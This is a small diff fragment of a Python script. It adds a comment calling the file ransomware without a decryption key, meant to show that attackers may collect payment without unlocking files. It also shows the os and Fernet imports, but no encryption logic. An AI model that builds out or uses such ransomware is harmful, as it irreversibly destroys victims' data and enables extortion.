@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-
+#This is a ransomware without the decryption key and it is to demonstrate some hackers will collect payment without any intention of releasing the locked file.
 import os
 from cryptography.fernet import Fernet
 
